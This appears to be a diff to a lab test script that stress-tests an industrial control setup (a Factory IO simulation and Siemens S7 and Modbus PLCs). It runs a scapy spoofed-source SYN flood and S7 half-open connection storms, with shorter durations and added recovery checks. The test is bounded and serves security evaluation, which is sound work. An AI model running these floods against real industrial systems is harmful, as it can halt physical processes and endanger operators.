@@ -50,27 +50,30 @@ PY
 # G-D bounded connection-tracking (state) exhaustion
 abort_if_process_down state_exhaustion probe && {
   ctb=$(sudo conntrack -C 2>/dev/null || echo NA)
-  sudo ip netns exec "$NS_ATK" timeout 20 python3 - "$PLC1" <<'PY' 2>/dev/null
+  sudo ip netns exec "$NS_ATK" timeout 10 python3 - "$PLC1" <<'PY' 2>/dev/null
 try:
     from scapy.all import IP,TCP,send,conf; conf.verb=0
-    import sys,random,time,itertools; d=sys.argv[1]; end=time.time()+18
+    import sys,random,time,itertools; d=sys.argv[1]; end=time.time()+8
     while time.time()<end:
         send(IP(src="192.168.9.%d"%random.randint(1,254),dst=d)/TCP(sport=random.randint(1024,65535),dport=502,flags="S"),verbose=0)
 except Exception as e: print("err",e)
 PY
   cta=$(sudo conntrack -C 2>/dev/null || echo NA)
   legit=$([ "$(online)" = "1" ] && echo PROCESS_OK || echo PROCESS_DEGRADED)
-  rec state_exhaustion "20s spoofed-source SYN flood" "$legit" "conntrack before=$ctb after=$cta"
-  clean_all_reactive; selfheal; sleep 4; }
+  rec state_exhaustion "8s spoofed-source SYN flood" "$legit" "conntrack before=$ctb after=$cta"
+  clean_all_reactive; selfheal; tank_frozen && { rec state_exhaustion "tank froze" FACTORYIO_EVICTED "transport-layer residual - recovering"; recover_process; }; sleep 4; }
 
 # G-E half-open pool pressure on the S7-1200 (bounded; abort on degrade)
 abort_if_process_down half_open probe && {
-  for k in 1 2 3 4 5; do
+  for k in 1 2 3; do
     sudo ip netns exec "$NS_ATK" timeout 3 python3 "$S7" --host "$PLC1" --storm --secs 1 --hz 5 >/dev/null 2>&1
     clean_src "$IP_ATK"; sleep 2
     abort_if_process_down half_open "burst $k" || break
   done
-  rec half_open "5 isolate-mid-session bursts" "$([ "$(online)" = "1" ] && echo PLC_POOL_OK || echo PLC_POOL_STRESSED)" "silent drop leaves half-open until PLC TCP timeout"; }
+  # online() stays 1 even when Factory IO is evicted, so check tank liveness explicitly
+  froz=$(tank_frozen && echo FACTORYIO_EVICTED || echo PLC_POOL_OK)
+  rec half_open "3 isolate-mid-session bursts" "$froz" "half-open on S7 accept queue until PLC TCP timeout"
+  [ "$froz" = FACTORYIO_EVICTED ] && recover_process; }
 
 # G-F rarest Modbus / MEI codes (intermittent recovery is a known sensor limit)
 for fc in 0x11 0x2b 0x08; do
